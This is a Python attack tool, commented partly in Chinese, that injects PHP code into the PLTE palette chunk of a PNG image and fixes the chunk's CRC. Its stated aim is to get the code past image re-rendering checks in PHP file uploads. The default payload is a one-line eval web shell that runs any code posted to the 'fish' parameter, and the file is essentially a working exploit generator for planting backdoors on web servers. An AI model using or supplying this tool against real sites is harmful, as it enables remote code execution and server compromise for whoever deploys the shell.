import zlib
import struct
import argparse
from PIL import Image

def generate_payload(image_path, php_code, insert_offset):
    try:
        image = Image.open(image_path)
    except Exception as e:
        print(f"[x] Failed to open image: {e}")
        return

    with open(image_path, "rb") as f:
        data = f.read()

    if data[:8] != b"\x89PNG\r\n\x1a\n":
        print("[x] Not a valid PNG file.")
        return

    # 确保是索引色图像，否则转换
    if image.mode != 'P':
        print(f"[*] Current color mode: {image.mode}")
        print("[*] Converting to indexed color mode (P)...")

        convert_image_path = image_path[:-4] + "-Indexed-color.png"
        image.convert("P", colors=256).save(convert_image_path)
        image = Image.open(convert_image_path)

        with open(convert_image_path, "rb") as f:
            data = f.read()

        print(f"[*] Conversion completed: {convert_image_path}")

    # 初始化新 PNG 数据
    offset = 8
    new_data = data[:offset]
    php_bytes = php_code.encode("utf-8")

    while offset < len(data):
        length = struct.unpack(">I", data[offset:offset + 4])[0]
        chunk_type = data[offset + 4:offset + 8]
        chunk_data = data[offset + 8:offset + 8 + length]
        crc = data[offset + 8 + length:offset + 12 + length]

        if chunk_type == b'PLTE':
            print("[*] PLTE chunk found, injecting PHP code...")

            if insert_offset >= length:
                print("[x] Error: Insert offset is beyond the PLTE chunk length.")
                return

            available = length - insert_offset
            if len(php_bytes) > available:
                print(f"[!] Warning: Payload too long, truncated from {len(php_bytes)} to {available} bytes.")
                php_bytes = php_bytes[:available]

            padded = (
                chunk_data[:insert_offset] +
                php_bytes +
                chunk_data[insert_offset + len(php_bytes):]
            )

            new_crc = struct.pack(">I", zlib.crc32(b'PLTE' + padded) & 0xffffffff)

            new_data += struct.pack(">I", length)
            new_data += b'PLTE'
            new_data += padded
            new_data += new_crc
        else:
            new_data += data[offset:offset + 12 + length]

        offset += length + 12

    output_path = image_path[:-4] + "-payload.png"
    with open(output_path, "wb") as f:
        f.write(new_data)

    print("[*] Payload injected successfully.")
    print(f"[*] Output saved to: {output_path}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="Used to generate PNG images for inserting PHP payloads, bypassing the image rendering process in PHP file uploads."
    )

    parser.add_argument(
        '-i', '--input',
        type=str,
        required=True,
        help="Original PNG image path"
    )

    parser.add_argument(
        '-p', '--payload',
        type=str,
        default="<?php @eval($_POST['fish']);?>",
        help="Injected PHP code (Default: <?php @eval($_POST['fish']);?>)"
    )

    parser.add_argument(
        '-o', '--offset',
        type=int,
        default=25,
        help="Insert the offset byte of the payload into the PLTE block (Default: 25)"
    )

    args = parser.parse_args()
    generate_payload(args.input, args.payload, args.offset)
